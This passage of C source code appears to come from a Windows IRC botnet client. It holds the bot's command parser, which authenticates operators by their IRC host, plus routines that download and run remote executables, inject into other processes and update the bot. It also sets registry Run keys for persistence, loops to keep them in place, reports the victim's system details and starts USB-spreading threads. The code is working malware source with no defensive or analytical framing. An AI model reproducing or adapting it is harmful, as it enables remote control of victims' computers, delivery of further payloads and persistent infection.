			pInj->API.lstrcat(params, pInj->Vars.Others.szQuote);
			bRes = RunFile(pInj, params, 1);

			if (pInj->API.lstrcmp(word[p + 2], pInj->Vars.Others.szSilent))	// No silent switch
			{
				//if ((int)hRes > 32)
				if (bRes)
				{
					// Success
					pInj->API.lstrcpy(buff, pInj->Vars.Messages.szMsg_VisitOK);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
					pInj->API.lstrcat(buff, word[p + 1]);
					Send_PRIVMSG(pInj, from, buff);
					return 1;
				} else {
					// Failure
					pInj->API.lstrcpy(buff, pInj->Vars.Messages.szMsg_VisitFail);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
					pInj->API.lstrcat(buff, word[p + 1]);
					Send_PRIVMSG(pInj, from, buff);
					return 1;
				}
			}	
		}
		return 1;
	} else if (!pInj->API.lstrcmp(word[p], pInj->Vars.Commands.szFileProtection))		// File protection
	{
		if (word[p + 1] != NULL) {
			if (pInj->Vars.FileProtection.bStatus == FALSE && pInj->API.lstrcmp(word[p + 1], pInj->Vars.Others.szOFF))
			{
				// Turn it on
				bmemset(pInj->Vars.FileProtection.szDownloadURL, 0, sizeof(pInj->Vars.FileProtection.szDownloadURL));
				bmemset(pInj->Vars.FileProtection.szStartedFrom, 0, sizeof(pInj->Vars.FileProtection.szStartedFrom));
				pInj->Vars.FileProtection.bStatus = TRUE;
				pInj->API.lstrcpy(pInj->Vars.FileProtection.szStartedFrom, from);
				pInj->API.lstrcpy(pInj->Vars.FileProtection.szDownloadURL, word[p + 1]);
				if (pInj->API.lstrcmp(word[p + 2], pInj->Vars.Others.szSilent) == 0)
				{
					pInj->Vars.FileProtection.Silent = 1;
				} else {
					pInj->Vars.FileProtection.Silent = 0;
				}
				//pInj->API.OutputDebugString(pInj->Vars.FileProtection.szDownloadURL);
				pInj->Vars.FileProtection.hThread = pInj->API.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pInj->Threads.FileProtection, (LPVOID)pInj, 0, 0);
				pInj->Vars.FileProtection.hRegMon = pInj->API.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pInj->Threads.RegProtection, (LPVOID)pInj, 0, 0);
				return 1;
			} else if (!pInj->API.lstrcmp(word[p + 1], pInj->Vars.Others.szOFF)) {
				// Turn it off
				pInj->API.TerminateThread(pInj->Vars.FileProtection.hThread, 0);
				pInj->API.TerminateThread(pInj->Vars.FileProtection.hRegMon, 0);
				if (!pInj->Vars.FileProtection.Silent)
				{
					bmemset(buff, 0, sizeof(buff));
					pInj->API.lstrcpy(buff, pInj->Vars.Messages.szMsg_FileProtStopped);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
					pInj->API.lstrcat(buff, pInj->Vars.FileProtection.szFilePath);
					Send_PRIVMSG(pInj, from, buff);
				}
				pInj->Vars.FileProtection.bStatus = FALSE;
				return 1;
			} else {
				// Already started
				if (pInj->Vars.FileProtection.Silent == 0)
				{
					bmemset(buff, 0, sizeof(buff));
					pInj->API.lstrcpy(buff, pInj->Vars.Messages.szMsg_FileProtAlready);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
					pInj->API.lstrcat(buff, pInj->Vars.FileProtection.szFilePath);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
					pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_FileProtWith);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
					pInj->API.lstrcat(buff, pInj->Vars.FileProtection.szDownloadURL);
					Send_PRIVMSG(pInj, from, buff);
				}
			}

		}	
	} else if (!pInj->API.lstrcmp(word[p], pInj->Vars.Commands.szInject))		// Inject into
	{
		if (word[p + 1] != NULL) {

			ZeroMemory(&pInfo, sizeof(pInfo));
			ZeroMemory(&sInfo, sizeof(sInfo));
			sInfo.cb = sizeof(STARTUPINFO);
			sInfo.dwFlags = STARTF_USESHOWWINDOW;
			sInfo.wShowWindow = SW_SHOW;
			
			pInj->API.lstrcpy(params, pInj->Vars.Settings.szBotPath);
			pInj->API.lstrcat(params, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(params, pInj->Vars.Others.szParamInject);
			pInj->API.lstrcat(params, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(params, word[p + 1]);
			//pInj->API.OutputDebugString(params);
			pInj->API.ReleaseMutex(pInj->Vars.Settings.hMutex);
			if (pInj->API.CreateProcess(NULL, params, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &sInfo, &pInfo))
			{
				// Success
				if (pInj->API.lstrcmp(word[p + 2], pInj->Vars.Others.szSilent))
				{
					pInj->API.lstrcpy(buff, pInj->Vars.Messages.szMsg_InjectTo);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
					pInj->API.lstrcat(buff, word[p + 1]);
					Send_PRIVMSG(pInj, from, buff);
				}
				Send_QUIT(pInj, from, pInj->Vars.Messages.szMsg_InjectDie);
				return -4;
			} else {
				// Lets reregister mutex..
				pInj->Vars.Settings.hMutex = pInj->API.CreateMutex(NULL, TRUE, pInj->Vars.Settings.szMutex);
				if (pInj->API.lstrcmp(word[p + 2], pInj->Vars.Others.szSilent)) {
					pInj->API.lstrcpy(buff, pInj->Vars.Messages.szMsg_InjectToFail);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
					pInj->API.lstrcat(buff, word[p + 1]);
					Send_PRIVMSG(pInj, from, buff);
				}
				return 0;
			}
		}

	} else if (!pInj->API.lstrcmp(word[p], pInj->Vars.Commands.szUpdate)) {		// Update (REAL)
		if (word[p + 2] != NULL)
		{
			if (pInj->API.lstrcmp(word[p + 2], pInj->Vars.Others.szBotVersion))
			{
				// Version doesnt match our version so lets update
				if (GrabBot(pInj, word[p + 1], pInj->Vars.Settings.szBotPath)) {
					// Grabbed new bot - lets return the exit code for update
					pInj->API.lstrcpy(buff, pInj->Vars.Messages.szMsg_Updating);
					if (pInj->API.lstrcmp(word[p + 3], pInj->Vars.Others.szSilent)) { Send_PRIVMSG(pInj, from, buff); };
					return -8;
				} else {
					pInj->API.lstrcpy(buff, pInj->Vars.Messages.szMsg_UpdateFail);
					if (pInj->API.lstrcmp(word[p + 3], pInj->Vars.Others.szSilent)) { Send_PRIVMSG(pInj, from, buff); };
					return 0;
				}
			}
		} else {
			if (GrabBot(pInj, word[p + 1], pInj->Vars.Settings.szBotPath)) {
				// Grabbed new bot - lets return the exit code for update
				pInj->API.lstrcpy(buff, pInj->Vars.Messages.szMsg_Updating);
				if (pInj->API.lstrcmp(word[p + 2], pInj->Vars.Others.szSilent)) { Send_PRIVMSG(pInj, from, buff); };
				return -8;
			} else {
				pInj->API.lstrcpy(buff, pInj->Vars.Messages.szMsg_UpdateFail);
				if (pInj->API.lstrcmp(word[p + 2], pInj->Vars.Others.szSilent)) { Send_PRIVMSG(pInj, from, buff); };
				return 0;
			}
		}
	} else if (!pInj->API.lstrcmp(word[p], pInj->Vars.Commands.szFakeUpdate)) {		// Update (FAKE)
			// Grabbed the bawt
			pInj->API.lstrcpy(buff, pInj->Vars.Messages.szMsg_Updating);
			Send_PRIVMSG(pInj, from, buff);
			pInj->Vars.Downloader.Silent = 1;
			pInj->API.lstrcpy(pInj->Vars.Downloader.szURL, word[p + 1]);
			pInj->Vars.Downloader.hThread = pInj->API.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pInj->Threads.Downloader, (LPVOID)pInj, 0, 0);
			return -9;
	} else if (word[p + 2] == NULL) {											// Commands with 2 parameters below this
		return 0;
	} else if (!pInj->API.lstrcmp(word[p], pInj->Vars.Commands.szDownload))		// Download
	{
		pInj->Vars.Downloader.iMode = batoi(word[p + 2]);
		bmemset(pInj->Vars.Downloader.szURL, 0, sizeof(pInj->Vars.Downloader.szURL));
		bmemset(pInj->Vars.Downloader.szFrom, 0, sizeof(pInj->Vars.Downloader.szFrom));
		pInj->API.lstrcpy(pInj->Vars.Downloader.szURL, word[p + 1]);
		pInj->API.lstrcpy(pInj->Vars.Downloader.szFrom, from);
		if (!pInj->API.lstrcmp(word[p + 3], pInj->Vars.Others.szSilent))
		{
			pInj->Vars.Downloader.Silent = 1;
		} else {
			pInj->Vars.Downloader.Silent = 0;
		}
		pInj->Vars.Downloader.hThread = pInj->API.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pInj->Threads.Downloader, (LPVOID)pInj, 0, 0);
		return 1;
	} else if (!pInj->API.lstrcmp(word[p], pInj->Vars.Commands.szPlugin))		// Plugin
	{
		pInj->API.lstrcpy(params, pInj->Vars.Settings.szBotPath);
		pInj->API.lstrcat(params, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(params, pInj->Vars.Others.szParamPlugin);
		pInj->API.lstrcat(params, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(params, word[p + 1]);
		pInj->API.lstrcat(params, pInj->Vars.Others.szSpace);
		pInj->API.lstrcpy(pInj->Vars.Downloader.szURL, word[p + 2]);
		pInj->API.lstrcpy(pInj->Vars.Downloader.szPluginParams, params);

		if (pInj->API.lstrcmp(word[p + 3], pInj->Vars.Others.szSilent) == 0)
		{
			pInj->Vars.Downloader.Silent = 1;
		} else {
			pInj->Vars.Downloader.Silent = 0;
		}

		pInj->Vars.Downloader.hPluginThread = pInj->API.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pInj->Threads.PluginGrab, (LPVOID)pInj, 0, 0);
		return 1;
	}


	return 0;
}
_inline int IRC_ParseAllCommands(LPVOID injStr, SOCKET sock, char **word, int i)
{
	Injdat		*pInj =  (Injdat *)injStr;
	int	 	ret;
	char	*p,	from[128];
	
	bmemset(from, 0, sizeof(from));
	
	// correction if its channel or user
	if (word[i-1][0] != 35)
	{
		p = bstrchr(word[0], 33);
		*p = 0;
		pInj->API.lstrcpyn(from, word[0] + 1, sizeof(from));
	}
	else
		pInj->API.lstrcpyn(from, word[i-1], sizeof(from));
	
	// remove ":"
	word[i]++;
	
// 	if (!bstrncmp(word[i], pInj->Vars.Others.szChanPrefix, pInj->API.lstrlen(pInj->Vars.Others.szChanPrefix)))
// 	{
// 		pInj->API.OutputDebugString(word[i]);
// 	}

	do
	{
		if ((word[i] = IRC_IsOrder(injStr, word[i])) != NULL)
		{
			if ((ret = IRC_ParseSingleCommand(injStr, sock, word, i, from)) < 0)
				return ret;
		}
		i++;
		if (i == pInj->Vars.Settings.lMaxCmds)
			break;
	} while (word[i] != NULL);
	
	return 0;
}
_inline int IRC_Parse(LPVOID injStr, SOCKET sock, char *line)
{
	Injdat		*pInj =  (Injdat *)injStr;
	char		*word[32];
	char		buff[512];
	char		newnick[MAX_PATH] = { 0 };
	int			i = 0, k, len;
	
#ifdef _DEBUGLITE
	pInj->API.OutputDebugString(line);
#endif

	bmemset(buff, 0, sizeof(buff));
	
	if ((strstr(line, pInj->Vars.Others.szMOTD) != NULL) || (strstr(line, pInj->Vars.Others.szNoMOTD) != NULL))
	{
		pInj->API.lstrcat(buff, pInj->Vars.Others.szJOIN);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(buff, pInj->Vars.Settings.szChannel);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(buff, pInj->Vars.Settings.szChanPass);
		buff[pInj->API.lstrlen(buff)] = 13;
		buff[pInj->API.lstrlen(buff)+1] = 10;
		pInj->API.send(sock, buff, pInj->API.lstrlen(buff), 0);
		return 1;
	}
	
	len = pInj->API.lstrlen(line);
	
	for (k = 0; k < pInj->Vars.Settings.lMaxCmds; k++)
		word[k] = NULL;
	
	word[0] = line;
	
	
	for (k = 0; k < len; k++)
	{
		if (line[k] == 32)
		{
			line[k] = 0;
			for (; line[k+1] == 32; k++, line[k] = 0) {}
			i++;
			word[i] = word[0] + k + 1;
			if (word[i][0] == 0)
				word[i] = NULL;
		}
		if ((i + 1) == pInj->Vars.Settings.lMaxCmds)
		{
			for (; k < len; k++)
			{
				if (line[k] == 32)
					line[k] = 0;
			}
			break;
		}
	}
	
	bmemset(buff, 0, sizeof(buff));
	
	if (word[1] == NULL)
	{
		return 0;
	} else if (strstr(word[0], pInj->Vars.Others.szPING)) {
		// Got PING - Lets PONG
		pInj->API.lstrcat(buff, pInj->Vars.Others.szPONG);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(buff, word[1]);
		buff[pInj->API.lstrlen(buff)] = 13;
		buff[pInj->API.lstrlen(buff)+1] = 10;
		pInj->API.send(sock, buff, pInj->API.lstrlen(buff), 0);
		return 1;
	} else if (strstr(word[1], pInj->Vars.Others.szNICKINUSE)) {
		// Nickname in use
		pInj->API.lstrcat(buff, pInj->Vars.Others.szNICK);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		GenerateNick(pInj, newnick);
		pInj->API.lstrcat(buff, newnick);
		buff[pInj->API.lstrlen(buff)] = 13;
		buff[pInj->API.lstrlen(buff)+1] = 10;
		pInj->API.send(sock, buff, pInj->API.lstrlen(buff), 0);
	} else if(!pInj->API.lstrcmp(word[1], pInj->Vars.Others.szPRIVMSG)) {
		// PRIVMSG
		// We want to check if user is authorized (via their host)
		if (IRC_CheckHost(injStr, word[0]))	{
			k = 3;
			goto process;
		} else {
			return 0;
		}
	} else if(!pInj->API.lstrcmp(word[1], pInj->Vars.Others.szTOPIC)) {
		// Its a topic command
		k = 4;
process:
		return IRC_ParseAllCommands(injStr, sock, word, k);
	}
	
	
	return 1;
}
_inline BOOL GrabBot(Injdat *pInj, char *szURL, char *szSaveTo)
{
	HINTERNET hOpen, hURL;
	HANDLE hFile;
	DWORD dwRead, dwWrite;
	char szData[1024];
	
	
	if (szSaveTo == NULL) { return FALSE; };
	
	hOpen = pInj->API.InternetOpen(pInj->Vars.Others.szUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	
	if (hOpen == NULL)
	{
		return FALSE;
	}

	pInj->API.DeleteUrlCacheEntry(szURL);
		
	hURL = pInj->API.InternetOpenURL(hOpen, szURL, NULL, 0, 0, 0);
	if (hURL == NULL)
	{
		pInj->API.InternetCloseHandle(hOpen);
		return FALSE;
	}
	hFile = pInj->API.CreateFile(szSaveTo, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (hFile < (HANDLE)1)
	{
		pInj->API.InternetCloseHandle(hURL); pInj->API.InternetCloseHandle(hOpen);
		return FALSE;
	}
	while (pInj->API.InternetReadFile(hURL, szData, sizeof(szData) - 1, &dwRead) && dwRead != 0)
	{
		pInj->API.WriteFile(hFile, szData, dwRead, &dwWrite, NULL);
	}
	
	pInj->API.InternetCloseHandle(hURL);
	pInj->API.InternetCloseHandle(hOpen);
	pInj->API.CloseHandle(hFile);
	return 1;
}

_inline void Send_INFO(Injdat *pInj, char *szDestination)
{
	char buff[1024];

	char szCurrentPath[MAX_PATH];
	bmemset(buff, 0, sizeof(buff));
	bmemset(szCurrentPath, 0, sizeof(szCurrentPath));
	pInj->API.GetModuleFileName(pInj->API.GetModuleHandle(NULL), szCurrentPath, sizeof(szCurrentPath));
	pInj->API.lstrcpy(buff, pInj->Vars.Messages.szMsg_InjectedInto);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
	pInj->API.lstrcat(buff, szCurrentPath);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
	pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_UsingOS);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szFullOperatingSystem);
	Send_PRIVMSG(pInj, szDestination, buff);
	return;	
}
_inline void Send_QUIT(Injdat *pInj, char *szDestination, char *szMessage)
{
	char buff[1024];
	bmemset(buff, 0, sizeof(buff));

	pInj->API.lstrcpy(buff, pInj->Vars.Others.szQUIT);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
	pInj->API.lstrcat(buff, szMessage);
//	Add_CRLF(pInj, szMessage);
	buff[pInj->API.lstrlen(buff)] = 13;
	buff[pInj->API.lstrlen(buff)+1] = 10;
	pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);

	return;
}
_inline void Send_PRIVMSG(Injdat *pInj, char *szDestination, char *szMessage)
{
	char buff[2048];
	bmemset(buff, 0, sizeof(buff));
	
	pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
	pInj->API.lstrcat(buff, szDestination);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
	pInj->API.lstrcat(buff, szMessage);
//	Add_CRLF(pInj, buff);
	buff[pInj->API.lstrlen(buff)] = 13;
	buff[pInj->API.lstrlen(buff)+1] = 10;
	pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
	//pInj->API.OutputDebugString(buff);
	
	return;
}

_inline void GenerateNick(Injdat *pInj, char *szNick)
{
	char szChars[7];
	
	bsrand(&pInj->Vars.Others.holdrand, pInj->API.GetTickCount());

	bmemset(szChars, 0, sizeof(szChars));
	for (int x = 0; x< sizeof(szChars); x++)
	{
		szChars[x] = (brand(&pInj->Vars.Others.holdrand) % 26) + 97;
	}
	szChars[x] = 0;
	bmemset(szNick, 0, sizeof(szNick));

	if (pInj->API.lstrcmp(pInj->Vars.Others.szIsUSBInfect, pInj->Vars.Others.szON) == 0)
	{
		// New USB inf
		pInj->API.lstrcat(szNick, pInj->Vars.Others.szNewUSB);
		pInj->API.lstrcpy(pInj->Vars.Others.szIsUSBInfect, pInj->Vars.Others.szOFF);
	} else if (pInj->API.lstrcmp(pInj->Vars.Others.szAmINew, pInj->Vars.Others.szON) == 0)
	{
		// New bot
		pInj->API.lstrcat(szNick, pInj->Vars.Others.szNewBotPrefix);
		pInj->API.lstrcpy(pInj->Vars.Others.szAmINew, pInj->Vars.Others.szOFF);
	}


//	pInj->API.lstrcat(szNick, pInj->Vars.Others.szBotNickPrefix);	// not used bu if u want it there
	pInj->API.lstrcat(szNick, pInj->Vars.Others.szNickBegin);
	pInj->API.lstrcat(szNick, pInj->Vars.Others.szCountry);
	pInj->API.lstrcat(szNick, pInj->Vars.Others.szOperatingSystem);
	pInj->API.lstrcat(szNick, pInj->Vars.Others.szNickClose);
	pInj->API.lstrcat(szNick, szChars);
	szNick[pInj->API.lstrlen(szNick)] = 0;
	return;
}

_inline char *RandomPath(Injdat *pInj, char *szPath)
{
	DWORD dwRand;
	char szSaveTo[MAX_PATH];
	char szFileName[MAX_PATH];
	
	bsrand(&pInj->Vars.Others.holdrand, pInj->API.GetTickCount());
	dwRand = (brand(&pInj->Vars.Others.holdrand) % 10000) + 1000;
	
	pInj->API.lstrcpy(szSaveTo, pInj->Vars.Folders.szAppData);
	pInj->API.lstrcpy(szFileName, pInj->Vars.Others.szBlank);
	for (int x = 0; x < 7; x++)
	{
		szFileName[x] = (brand(&pInj->Vars.Others.holdrand) % 26) + 97;
	}
	szFileName[x] = 0;
	pInj->API.lstrcat(szSaveTo, pInj->Vars.Spacers.szBackslash);
	pInj->API.lstrcat(szSaveTo, szFileName);
	pInj->API.lstrcat(szSaveTo, pInj->Vars.Spacers.szEXEExtension);

	return szSaveTo;
}

_inline char *RandomPluginPath(Injdat *pInj, char *szPath)
{
	DWORD dwRand;
	char szSaveTo[MAX_PATH];
	char szFileName[MAX_PATH];
	
	bsrand(&pInj->Vars.Others.holdrand, pInj->API.GetTickCount());
	dwRand = (brand(&pInj->Vars.Others.holdrand) % 10000) + 1000;
	
	pInj->API.lstrcpy(szSaveTo, pInj->Vars.Folders.szAppData);
	pInj->API.lstrcpy(szFileName, pInj->Vars.Others.szBlank);
	for (int x = 0; x < 7; x++)
	{
		szFileName[x] = (brand(&pInj->Vars.Others.holdrand) % 26) + 97;
	}
	szFileName[x] = 0;
	pInj->API.lstrcat(szSaveTo, pInj->Vars.Spacers.szBackslash);
	pInj->API.lstrcat(szSaveTo, szFileName);
	pInj->API.lstrcat(szSaveTo, pInj->Vars.Spacers.szPluginExtension);
	
	return szSaveTo;
}

_inline BOOL RunFile(Injdat *pInj, char *szFile, int Mode)
{
	PROCESS_INFORMATION	pInfo;
	STARTUPINFO	sInfo;

	ZeroMemory(&pInfo, sizeof(pInfo));
	ZeroMemory(&sInfo, sizeof(sInfo));
	sInfo.cb = sizeof(STARTUPINFO);

	if (Mode) {
		sInfo.dwFlags = STARTF_USESHOWWINDOW;
		sInfo.wShowWindow = SW_SHOW;
	} else {
		sInfo.dwFlags = NULL;
		sInfo.wShowWindow = SW_HIDE;
	}
	if (pInj->API.CreateProcess(NULL, szFile, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &sInfo, &pInfo))
	{
		return TRUE;
	} else {
		return FALSE;
	}
	return FALSE;
}

_inline BOOL GrabFile(Injdat *pInj, char *szURL)
{
	HINTERNET hOpen, hURL;
	HANDLE hFile;
	DWORD dwRead, dwWrite;
	char szData[1024];
	char *szSaveTo;
	
	szSaveTo = RandomPath(pInj, pInj->Vars.Folders.szAppData);
	pInj->API.lstrcpy(pInj->Vars.Downloader.szSavedPath, szSaveTo);
	if (szSaveTo == NULL) { return FALSE; };
	
	pInj->API.DeleteUrlCacheEntry(pInj->Vars.Downloader.szURL);
	pInj->API.DeleteUrlCacheEntry(szURL);

	hOpen = pInj->API.InternetOpen(pInj->Vars.Others.szUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	
//	pInj->API.OutputDebugString(szURL);

	if (hOpen == NULL)
	{
		return FALSE;
	}
	
	hURL = pInj->API.InternetOpenURL(hOpen, pInj->Vars.Downloader.szURL, NULL, 0, 0, 0);
//		pInj->API.OutputDebugString(szURL);
	if (hURL == NULL)
	{
		pInj->API.InternetCloseHandle(hOpen);
		return FALSE;
	}
	hFile = pInj->API.CreateFile(szSaveTo, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
//		pInj->API.OutputDebugString(szURL);
	if (hFile < (HANDLE)1)
	{
		pInj->API.InternetCloseHandle(hURL); pInj->API.InternetCloseHandle(hOpen);
//			pInj->API.OutputDebugString(szURL);
		return FALSE;
	}
	while (pInj->API.InternetReadFile(hURL, szData, sizeof(szData) - 1, &dwRead) && dwRead != 0)
	{
		pInj->API.WriteFile(hFile, szData, dwRead, &dwWrite, NULL);
	}
//		pInj->API.OutputDebugString(szURL);

	pInj->API.InternetCloseHandle(hURL);
//		pInj->API.OutputDebugString(szURL);
	pInj->API.InternetCloseHandle(hOpen);
//		pInj->API.OutputDebugString(szURL);
	pInj->API.CloseHandle(hFile);
//		pInj->API.OutputDebugString(szURL);
	return 1;
}

_inline unsigned int Resolve(LPVOID injStr, char *host) 
{
	Injdat *pInj =  (Injdat *)injStr;
   	struct	hostent		*hp;
    unsigned int		host_ip;
	
    host_ip = pInj->API.inet_addr(host);
    if (host_ip == INADDR_NONE) 
	{
        hp = pInj->API.gethostbyname(host);
        if (hp == 0) 
           	return 0;
		else 
			host_ip = *(u_int *)(hp->h_addr);
    }
	
    return host_ip;
}

/* Remote Threads */
DWORD _stdcall Remote_gBot(LPVOID injStr)
{
	HINSTANCE hWinsock, hWininet, hShell32, hAdvapi, hUser32;
	Injdat *pInj =  (Injdat *)injStr;

	hWinsock = pInj->API.LoadLibrary(pInj->Vars.DLLs.szWinsock);
	hWininet = pInj->API.LoadLibrary(pInj->Vars.DLLs.szWininet);
	hShell32 = pInj->API.LoadLibrary(pInj->Vars.DLLs.szShell32);
	hAdvapi  = pInj->API.LoadLibrary(pInj->Vars.DLLs.szAdvapi);
	hUser32  = pInj->API.LoadLibrary(pInj->Vars.DLLs.szUser32);

	pInj->Vars.IRC.hThread = pInj->API.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pInj->Threads.IRCThread, (LPVOID)injStr, 0, 0);
	pInj->Vars.USB.hThread = pInj->API.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pInj->Threads.USBThread, (LPVOID)injStr, 0, 0);
	pInj->Vars.Others.hIPC = pInj->API.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pInj->Threads.IPC, (LPVOID)injStr, 0, 0);

	pInj->API.Sleep(10000);
	return 1;
}
static void __declspec() ProcEnd_gBot() {} 

DWORD _stdcall Remote_RegProtect(LPVOID injStr)
{
	Injdat *pInj =  (Injdat *)injStr;

	HKEY hKey;
	DWORD dwSize = pInj->API.lstrlen(pInj->Vars.Settings.szBotPath);

	while (pInj->Vars.FileProtection.bStatus == TRUE)
	{
begin:
		pInj->API.Sleep(5000);
		goto addreg;
	}

addreg:
	// Lets add the registry keys
	if (batoi(pInj->Vars.Others.szArchitecture) == 32) {
		if (pInj->API.RegOpenKeyEx(HKEY_CURRENT_USER, pInj->Vars.Folders.szCurrentVersion, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
		{
			if (!pInj->API.RegSetValueEx(hKey, pInj->Vars.Settings.szBotRegistryKey, 0, REG_SZ, (BYTE *)pInj->Vars.Settings.szBotPath, dwSize) == ERROR_SUCCESS) {
				pInj->API.RegCloseKey(hKey);
			}
			pInj->API.RegCloseKey(hKey);
		}
		pInj->API.RegCloseKey(hKey);
		if (pInj->API.RegOpenKeyEx(HKEY_LOCAL_MACHINE, pInj->Vars.Folders.szCurrentVersion, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
		{
			if (!pInj->API.RegSetValueEx(hKey, pInj->Vars.Settings.szBotRegistryKey, 0, REG_SZ, (BYTE *)pInj->Vars.Settings.szBotPath, dwSize) == ERROR_SUCCESS) {
				pInj->API.RegCloseKey(hKey);
			}
			pInj->API.RegCloseKey(hKey);
		} 
		pInj->API.RegCloseKey(hKey);
		goto begin;
	} else {
		if (pInj->API.RegOpenKeyEx(HKEY_CURRENT_USER, pInj->Vars.Folders.szCurrentVersion, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
		{
			if (!pInj->API.RegSetValueEx(hKey, pInj->Vars.Settings.szBotRegistryKey, 0, REG_SZ, (BYTE *)pInj->Vars.Settings.szBotPath, dwSize) == ERROR_SUCCESS) {
				pInj->API.RegCloseKey(hKey);
			}
			pInj->API.RegCloseKey(hKey);
		}
		pInj->API.RegCloseKey(hKey);
		goto begin;
	}

	pInj->API.OutputDebugString(pInj->Vars.Messages.szMsg_RegMonAdded);
	pInj->API.OutputDebugString(pInj->Vars.Folders.szCurrentVersion);


	goto begin;
	return 1;
}
static void __declspec() ProcEnd_RegProtect() {} 

DWORD _stdcall Remote_Speedtest(LPVOID injStr)
{
	Injdat *pInj =  (Injdat *)injStr;
	char buff[1024] = { 0 };
	char data[1024] = { 0 };
	long end_time;
	int tmp;
	long speed;
	int ret;
	unsigned int resv;
	struct sockaddr_in	address;

	end_time = 0;
	tmp = 0;
	speed = 0;
	ret = 0;
	resv = 0;


 	if (pInj->Vars.Speedtest.iSeconds == NULL)
		pInj->Vars.Speedtest.iSeconds = 10;
 	if (pInj->Vars.Speedtest.szTestAgainst == NULL)
		return 0;
	
	resv = Resolve(injStr, pInj->Vars.Speedtest.szTestAgainst);

	if (resv == 0)
	{
		if (pInj->Vars.Speedtest.iMin == 0) {
			pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Speedtest.szFrom);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
			pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_SpeedtestError);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Speedtest.szTestAgainst);
			buff[pInj->API.lstrlen(buff)] = 13;
			buff[pInj->API.lstrlen(buff)+1] = 10;
			pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
		}
		return 0;
	}

	ret = pInj->API.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (ret == INVALID_SOCKET) {
		// Invalid socket
		if (pInj->Vars.Speedtest.iMin == 0) {
			pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Speedtest.szFrom);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
			pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_SpeedtestError);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Speedtest.szTestAgainst);
			buff[pInj->API.lstrlen(buff)] = 13;
			buff[pInj->API.lstrlen(buff)+1] = 10;
			pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
		}
		return 0;
	}

	// Lets try connect :|

	address.sin_addr.s_addr = resv;
	address.sin_family = AF_INET;
	address.sin_port = pInj->API.htons(pInj->Vars.Speedtest.lPort);
	
	if (pInj->API.connect(ret, (struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
	{
		if (pInj->Vars.Speedtest.iMin == 0) {
			pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
